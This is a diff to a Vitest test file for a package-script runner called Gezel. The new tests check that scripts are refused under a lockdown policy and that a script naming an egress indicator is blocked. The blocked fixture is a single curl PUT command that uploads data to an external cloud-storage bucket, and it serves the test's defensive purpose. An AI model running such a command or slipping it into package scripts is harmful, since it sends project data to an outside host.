@@ -1,6 +1,7 @@
 import { mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
+import { securityPolicyForLevel } from '@bendyline/gezel';
 import { afterEach, beforeEach, describe, expect, it } from 'vitest';
 import { Store } from '../fs/store.js';
 import { applyCommandApprovalAnswer } from './command-approval-answer.js';
@@ -13,6 +14,8 @@ beforeEach(async () => {
   home = await mkdtemp(join(tmpdir(), 'gezel-scripts-test-'));
   store = new Store({ home });
   await store.ensureLayout();
+  // Package scripts are their own switch, off outside free.
+  await store.writeConfig({ securityPolicy: securityPolicyForLevel('free') });
 });
 
 afterEach(async () => {
@@ -95,6 +98,46 @@ describe('runPackageScript', () => {
     expect(res.ok).toBe(false);
     expect(res.error).toContain('not defined');
     expect(res.error).toContain('build');
+  });
+
+  it('refuses every package command while Run package scripts is off', async () => {
+    await store.writeConfig({ securityPolicy: securityPolicyForLevel('lockdown') });
+    const p = await store.createProject({ name: 'p' });
+    await seedWorkspace(p.id, { scripts: { test: 'echo ok' }, deps: { vitest: '1.0.0' } });
+    const script = await runPackageScript({ store, home, projectId: p.id, script: 'test' });
+    const npx = await runNpx({ store, home, projectId: p.id, bin: 'vitest' });
+    for (const res of [script, npx]) {
+      expect(res.ok).toBe(false);
+      expect(res.error).toContain('"Run package scripts" is off');
+    }
+    expect(await store.listProjectQuestions(p.id)).toEqual([]);
+  });
+
+  it('refuses a script whose command names an egress indicator, before asking anyone', async () => {
+    const p = await store.createProject({ name: 'p' });
+    await seedWorkspace(p.id, {
+      scripts: { probe: 'curl -X PUT --data x https://sanmaohe.oss-cn-beijing.aliyuncs.com/t' },
+    });
+    const logged: Array<{ kind: string; details?: Record<string, unknown> }> = [];
+    const res = await runPackageScript({
+      store,
+      home,
+      projectId: p.id,
+      script: 'probe',
+      gezelId: 'g',
+      sessionId: 's',
+      history: { log: async (event) => void logged.push(event) } as never,
+    });
+    expect(res.ok).toBe(false);
+    expect(res.error).toContain('Blocked by Gezel');
+    expect(res.approvalPending).toBeUndefined();
+    expect(await store.listProjectQuestions(p.id)).toEqual([]);
+    expect(logged).toMatchObject([
+      {
+        kind: 'security.tool-call-blocked',
+        details: { tool: 'run_package_script', surface: 'gezel-tool' },
+      },
+    ]);
   });
 
   it('returns approvalPending on first call with a session, then runs after approval', async () => {
